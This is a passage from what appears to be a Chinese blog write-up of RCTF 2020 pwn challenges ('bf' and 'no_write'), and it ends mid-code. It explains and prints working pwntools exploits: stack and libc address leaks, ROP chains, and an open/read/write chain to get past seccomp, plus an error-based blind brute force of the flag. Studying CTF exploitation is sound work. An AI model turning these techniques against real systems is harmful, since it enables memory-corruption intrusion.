+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">",[.&gt;,]&gt;."</span>)</span><br><span class="line">p.send(<span class="string">"B"</span>*<span class="number">0x3ff</span>+<span class="string">'\x00'</span>)  <span class="comment"># 0x400</span></span><br><span class="line">p.recvuntil(<span class="string">"running....\n"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"B"</span>*<span class="number">0x3ff</span>)</span><br><span class="line">low_bit = ord(p.recv(<span class="number">1</span>))</span><br><span class="line">info(<span class="string">'low_bit: '</span>+ hex(low_bit))</span><br><span class="line"><span class="keyword">if</span> low_bit + <span class="number">0x70</span> &gt;= <span class="number">0x100</span>: <span class="comment"># :(</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<p>有了合适的最低字节之后，我们查看栈上有没有可以利用到的数据。</p>
+<img src="/2020/08/01/2020rctf-some-pwn/2.png">
+<p>在地址<code>0x7ffd464a22d0</code>后面偏移0x20的位置处能看到一个和栈相关的地址，泄露出来我们就能获得栈地址，再往后面看到返回地址处是libc相关的，所以我们再次泄露出返回地址就能得到libc的基地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak stack</span></span><br><span class="line">p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">",[&gt;,]&gt;,"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"running....\n"</span>)</span><br><span class="line">p.send(<span class="string">"B"</span>*<span class="number">0x3ff</span>+<span class="string">'\x00'</span>)</span><br><span class="line">p.send(chr(low_bit+<span class="number">0x20</span>))  </span><br><span class="line">p.recvuntil(<span class="string">"your code: "</span>)</span><br><span class="line">stack = u64(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - <span class="number">0xd8</span>  </span><br><span class="line">info(<span class="string">"stack : "</span> + hex(stack))</span><br><span class="line">p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">p.send(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">",[&gt;,]&gt;,"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"running....\n"</span>)</span><br><span class="line">p.send(<span class="string">"B"</span>*<span class="number">0x3ff</span>+<span class="string">'\x00'</span>)</span><br><span class="line">p.send(chr(low_bit+<span class="number">0x38</span>))</span><br><span class="line">p.recvuntil(<span class="string">"your code: "</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - <span class="number">0x21b97</span></span><br><span class="line">info(<span class="string">"libc : "</span> + hex(libc.address))</span><br><span class="line">p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">p.send(<span class="string">'y'</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="构造ROP-chain执行read"><a href="#构造ROP-chain执行read" class="headerlink" title="构造ROP chain执行read"></a>构造ROP chain执行read</h3><p>首先是找gadget，<code>pop rdi</code>之类的还是很好找的，用工具一下就能出来，但是这个<code>syscall; ret;</code>的gadget用工具没有找到，所以我在libc中开始人工查找，最后发现了<code>get_uid</code>之类的函数，它的整体就只有三句汇编，最后两句就是我们想要的。这里就学到了一点，以后找syscall的gadget直接找<code>get_uid</code>就好了。</p>
+<p>然后是写入数据了，发现一个问题，那就是我们写入数据是利用的之前写brainfuck代码的功能，这个栈空间因为我们输入的代码字符串被破坏，而每次写入的15字节中的前8个字节会被覆盖成我们输入的brainfuck代码，所以这里采用每轮循环会重复写入一段数据来消除这种影响。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_low_bit</span><span class="params">(low_bit,offset)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">",[&gt;,]&gt;,"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"running....\n"</span>)</span><br><span class="line">    p.send(<span class="string">"B"</span>*<span class="number">0x3ff</span>+<span class="string">'\x00'</span>)</span><br><span class="line">    p.send(chr(low_bit+offset))</span><br><span class="line">    p.recvuntil(<span class="string">"your code: "</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'y'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">"\x00"</span>*<span class="number">0xf</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'y'</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">rop_chain = [</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,p_rdi,<span class="number">0</span>,p_rdx_rsi,<span class="number">0x100</span>,stack,libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rop_chain_len = len(rop_chain)  <span class="comment"># len=8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(rop_chain_len<span class="number">-1</span>,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line">    write_low_bit(low_bit,<span class="number">0x57</span><span class="number">-8</span>*(rop_chain_len<span class="number">-1</span>-i))</span><br><span class="line">    p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">'\x00'</span>+p64(rop_chain[i<span class="number">-1</span>])+p64(rop_chain[i])[:<span class="number">6</span>])</span><br><span class="line">    p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'y'</span>)</span><br></pre></td></tr></table></figure>
+<p>这种输入刚好让rop chain能够覆盖到返回地址，在函数返回之后会读入orw的rop来绕过seccomp的限制。其中比较巧妙的是利用错位和<code>\x00</code>来补位。</p>
+<h3 id="read读入orw获得flag"><a href="#read读入orw获得flag" class="headerlink" title="read读入orw获得flag"></a>read读入orw获得flag</h3><p>剩下的就是构造orw的rop来完成最后的利用，因为我们的上个rop的长度是0x30，而我们的stack是返回地址，所以我们的rop起点是stack+0x30，读入是从stack开始的，所以前面空出的0x30数据段可以填入<code>/flag</code>。</p>
+<p>需要记得在最后退出主函数之前，需要把字符串的指针地址复原。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">write_low_bit(low_bit,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">''</span>)</span><br><span class="line">p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">p.send(<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"/flag"</span>.ljust(<span class="number">0x30</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += flat([</span><br><span class="line">    p_rax,<span class="number">2</span>,p_rdi,stack,p_rdx_rsi,<span class="number">0</span>,<span class="number">0</span>,syscall_ret,</span><br><span class="line">    p_rdi,<span class="number">3</span>,p_rdx_rsi,<span class="number">0x80</span>,stack+<span class="number">0x200</span>,p_rax,<span class="number">0</span>,syscall_ret,</span><br><span class="line">    p_rax,<span class="number">1</span>,p_rdi,<span class="number">1</span>,syscall_ret</span><br><span class="line">])</span><br><span class="line">pause()</span><br><span class="line">p.send(payload.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>))</span><br></pre></td></tr></table></figure>
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>整道题比较有趣的地方是那个如何控制好写入rop chain，使用到brainfuck代码来完成持续的写入。通过这道题也了解到C++中string的结构。这里给出官方的exp，完整exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_low_bit</span><span class="params">(low_bit,offset)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">",[&gt;,]&gt;,"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"running....\n"</span>)</span><br><span class="line">    p.send(<span class="string">"B"</span>*<span class="number">0x3ff</span>+<span class="string">'\x00'</span>)</span><br><span class="line">    p.send(chr(low_bit+offset))</span><br><span class="line">    p.recvuntil(<span class="string">"your code: "</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'y'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">"\x00"</span>*<span class="number">0xf</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(host,port=<span class="number">6002</span>)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">if</span> host:</span><br><span class="line">        p = remote(host,port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = process(<span class="string">"./bf"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    <span class="comment"># leak low_bit</span></span><br><span class="line">    p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    p.sendline(<span class="string">",[.&gt;,]&gt;."</span>)</span><br><span class="line">    p.send(<span class="string">"B"</span>*<span class="number">0x3ff</span>+<span class="string">'\x00'</span>)  <span class="comment"># 0x400</span></span><br><span class="line">    p.recvuntil(<span class="string">"running....\n"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"B"</span>*<span class="number">0x3ff</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    low_bit = ord(p.recv(<span class="number">1</span>))</span><br><span class="line">    info(<span class="string">'low_bit: '</span>+ hex(low_bit))</span><br><span class="line">    <span class="keyword">if</span> low_bit + <span class="number">0x70</span> &gt;= <span class="number">0x100</span>: <span class="comment"># :(</span></span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># debug(0x000000000001C47)</span></span><br><span class="line">    p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak stack</span></span><br><span class="line">    p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">",[&gt;,]&gt;,"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"running....\n"</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    p.send(<span class="string">"B"</span>*<span class="number">0x3ff</span>+<span class="string">'\x00'</span>)</span><br><span class="line">    p.send(chr(low_bit+<span class="number">0x20</span>))  </span><br><span class="line">    p.recvuntil(<span class="string">"your code: "</span>)</span><br><span class="line">    stack = u64(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - <span class="number">0xd8</span>  </span><br><span class="line">    info(<span class="string">"stack : "</span> + hex(stack))</span><br><span class="line">    p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'y'</span>)</span><br><span class="line">    <span class="comment"># leak libc</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">",[&gt;,]&gt;,"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"running....\n"</span>)</span><br><span class="line">    p.send(<span class="string">"B"</span>*<span class="number">0x3ff</span>+<span class="string">'\x00'</span>)</span><br><span class="line">    p.send(chr(low_bit+<span class="number">0x38</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"your code: "</span>)</span><br><span class="line">    libc.address = u64(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - <span class="number">0x21b97</span></span><br><span class="line">    info(<span class="string">"libc : "</span> + hex(libc.address))</span><br><span class="line">    p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># do rop</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x00000000000a17e0: pop rdi; ret;</span></span><br><span class="line">    <span class="comment"># 0x00000000001306d9: pop rdx; pop rsi; ret;</span></span><br><span class="line">    p_rdi = <span class="number">0x00000000000a17e0</span> + libc.address</span><br><span class="line">    p_rdx_rsi = <span class="number">0x00000000001306d9</span> + libc.address</span><br><span class="line">    ret = <span class="number">0x00000000000d3d8a</span> + libc.address</span><br><span class="line">    p_rax = <span class="number">0x00000000000439c8</span> + libc.address</span><br><span class="line">    syscall_ret = <span class="number">0x00000000000d2975</span> + libc.address  <span class="comment"># d2975!! get uid func</span></span><br><span class="line"></span><br><span class="line">    rop_chain = [</span><br><span class="line">        <span class="number">0</span>,<span class="number">0</span>,p_rdi,<span class="number">0</span>,p_rdx_rsi,<span class="number">0x100</span>,stack,libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    rop_chain_len = len(rop_chain)  <span class="comment"># len=8</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(rop_chain_len<span class="number">-1</span>,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line">        write_low_bit(low_bit,<span class="number">0x57</span><span class="number">-8</span>*(rop_chain_len<span class="number">-1</span>-i))</span><br><span class="line">        p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">        p.sendline(<span class="string">'\x00'</span>+p64(rop_chain[i<span class="number">-1</span>])+p64(rop_chain[i])[:<span class="number">6</span>])</span><br><span class="line">        p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">        p.send(<span class="string">'y'</span>)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">    write_low_bit(low_bit,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"enter your code:\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">''</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"continue?\n"</span>)</span><br><span class="line">    p.send(<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">"/flag"</span>.ljust(<span class="number">0x30</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    payload += flat([</span><br><span class="line">        p_rax,<span class="number">2</span>,p_rdi,stack,p_rdx_rsi,<span class="number">0</span>,<span class="number">0</span>,syscall_ret,</span><br><span class="line">        p_rdi,<span class="number">3</span>,p_rdx_rsi,<span class="number">0x80</span>,stack+<span class="number">0x200</span>,p_rax,<span class="number">0</span>,syscall_ret,</span><br><span class="line">        p_rax,<span class="number">1</span>,p_rdi,<span class="number">1</span>,syscall_ret</span><br><span class="line">    ])</span><br><span class="line">    pause()</span><br><span class="line">    p.send(payload.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    libc = ELF(<span class="string">"./libc.so.6"</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">    <span class="comment"># elf = ELF("./bf",checksec=False)</span></span><br><span class="line">    main(args[<span class="string">'REMOTE'</span>])</span><br></pre></td></tr></table></figure>
+<h2 id="no-write"><a href="#no-write" class="headerlink" title="no_write"></a>no_write</h2><p>一道花式rop的栈溢出题目，在ida中看到有prctl，用工具查看它的seccomp设置。</p>
+<img src="/2020/08/01/2020rctf-some-pwn/3.png">
+<p>发现只能使用<code>open</code>和<code>read</code>两个系统调用，又没有泄露函数。随后查看它的保护措施。</p>
+<img src="/2020/08/01/2020rctf-some-pwn/4.png">
+<p>开启了<code>full relro</code>不能使用<code>ret2dl_reslove</code>的攻击方法，但是我们有<code>open</code>和<code>read</code>，是可以想方法<code>open ./flag</code>，然后读入我们可控的数据段中。剩下的方法就是怎么把<code>flag</code>泄露出来。</p>
+<p>在看到的wp中有两种思路很类似SQL的盲注思想，一种是基于错误的盲注，在比较中构造一种情况，比较正确和比较错误其中的一种能够引发异常，通过判断异常来逐位爆破比较；另外一种是基于延时的盲注，还是类似的构造出二元情况，通过判断响应时间来逐位爆破比较。我这里使用基于错误的盲注来解决题目。</p>
+<h3 id="构造read读入rop-chain"><a href="#构造read读入rop-chain" class="headerlink" title="构造read读入rop chain"></a>构造read读入rop chain</h3><p>因为没有地址随机化，所以首先想到我们先构造<code>read</code>读入数据到我们可控的地址上，然后转移栈帧执行我们放入的rop chain。这里的rop chain使用了<code>csu_init</code>中的万能调用gadget，把写入数据放在<code>0x601350</code>，方便后续利用，通过gadget也能同时控制<code>rbp</code>，在末尾放置<code>leave ret</code>开启栈转移操作，控制<code>rip</code>指向我们的rop chain。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">'./no_write'</span>)</span><br><span class="line">pppppp_ret = <span class="number">0x00000000040076A</span></span><br><span class="line">read_got = <span class="number">0x000000000600FD8</span></span><br><span class="line">leave_tet = <span class="number">0x00000000040070B</span></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x18</span>+p64(pppppp_ret)+ret_csu(read_got,<span class="number">0</span>,<span class="number">0x601350</span>,<span class="number">0x400</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x6013f8</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(leave_tet)  <span class="comment"># move stack to 0x601400</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
+<h3 id="利用-libc-start-main"><a href="#利用-libc-start-main" class="headerlink" title="利用__libc_start_main"></a>利用__libc_start_main</h3><p>我们的第二次输入需要使用<code>__libc_start_main</code>调用<code>read_n</code>函数，把函数地址pop进<code>rdi</code>中，剩下的<code>rsi=0x601350</code>和<code>rdx=0x400</code>是可以直接沿用的值，调用<code>__libc_start_main</code>可以让栈上出现libc相关的地址，这样再利用gadget修改这些地址就可以得到我们想要的内容。我们要一位一位的爆破，肯定需要用于比较的指令，随后要使用系统调用肯定需要<code>syscall ret</code>，刚好在栈上残存了两个libc地址可以用。而怎么修改这两个地址？需要用到一个特殊的gadget。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005E8                 add     [rbp-3Dh], ebx</span><br><span class="line">.text:00000000004005EB                 nop     dword ptr [rax+rax+00h]</span><br><span class="line">.text:00000000004005F0                 rep retn</span><br></pre></td></tr></table></figure>
+<p>这里的<code>rbp</code>和<code>ebx</code>是可以通过之前的<code>csu_init</code>的gadget控制，所以我们可以用这个修改栈上的地址变成我们可以使用的gadget。</p>
+<p>我这里用于比较的函数是strncmp中的<code>__strncmp_sse42</code>，我们计算offset，让<code>ebx</code>为负数就会变成减。同时这里是要不断调试栈帧的，前面有一定长度的填充，要让<code>__libc_start_main</code>的结束返回地址放在<code>0x601350</code>上，这样我们第三次输入才能直接覆盖返回地址进行rop。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">call_libc_start_main = <span class="number">0x000000000400544</span></span><br><span class="line">readn = <span class="number">0x0000000004006BF</span></span><br><span class="line">p_rdi = <span class="number">0x0000000000400773</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"\x00"</span>*(<span class="number">0x100</span><span class="number">-0x50</span>)  <span class="comment"># 0x601400</span></span><br><span class="line">payload += p64(p_rdi)+p64(readn)+p64(call_libc_start_main)  <span class="comment"># also has rsi=0x601350 rdx=0x400</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x400</span>,<span class="string">'\x00'</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="逐位爆破flag"><a href="#逐位爆破flag" class="headerlink" title="逐位爆破flag"></a>逐位爆破flag</h3><p>在<code>__libc_start_main</code>调用完之后，用gadget修改栈上的libc地址为我们想要的gadget，随后开始用这些gadget执行open和read flag文件的操作，需要注意的一点，由于open操作没有对应的got表，所以需要系统调用才能使用，我们可以先调用一次read函数读入两个字节，让<code>rax=2</code>再用<code>syscall ret</code>调用open打开flag文件。读入flag到某个地址中，再读入我们的输入到<code>0x601fff</code>，这样比较的时候如果字符相同就会继续比较下一位，这样就溢出了程序可以控制的地址，引发错误，通过这种报错的方法一位一位爆破比较。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">offset = <span class="number">0x267870</span> <span class="comment">#initial - __strncmp_sse42</span></span><br><span class="line">payload = p64(pppppp_ret)+p64((<span class="number">0x100000000</span>-offset)&amp;<span class="number">0xffffffff</span>)</span><br><span class="line">payload += p64(<span class="number">0x601318</span>+<span class="number">0x3D</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x4005E8</span>)  <span class="comment"># add [rbp-3Dh], ebx</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x31dcb3</span> <span class="comment"># __exit_funcs_lock - syscall</span></span><br><span class="line">payload += p64(pppppp_ret)+p64((<span class="number">0x100000000</span>-offset)&amp;<span class="number">0xffffffff</span>)</span><br><span class="line">payload += p64(<span class="number">0x601310</span>+<span class="number">0x3D</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x4005E8</span>)</span><br><span class="line">payload += p64(pppppp_ret)+ret_csu(read_got,<span class="number">0</span>,<span class="number">0x601800</span>,<span class="number">2</span>)  <span class="comment"># make rax=2</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">payload += p64(pppppp_ret)+ret_csu(<span class="number">0x601310</span>,<span class="number">0x601350</span>+<span class="number">0x3f8</span>,<span class="number">0</span>,<span class="number">0</span>) <span class="comment">#open flag</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">payload += p64(pppppp_ret)+ret_csu(read_got,<span class="number">3</span>,<span class="number">0x601800</span>,<span class="number">0x100</span>)   <span class="comment">#read flag</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">payload += p64(pppppp_ret)+ret_csu(read_got,<span class="number">0</span>,<span class="number">0x601ff8</span>,<span class="number">8</span>)</span><br><span class="line"><span class="comment"># now we can cmp the flag one_by_one</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">6</span> </span><br><span class="line">payload += p64(pppppp_ret)+ret_csu(<span class="number">0x601318</span>,<span class="number">0x601800</span>+i,<span class="number">0x601fff</span>,<span class="number">2</span>)  <span class="comment"># cmp flag</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">payload += p64(p_rdi)+p64(<span class="number">0x601700</span>)+p64(p_rsi_r15)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(readn)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x3f8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += <span class="string">"flag\x00\x00\x00\x00"</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">p.send(<span 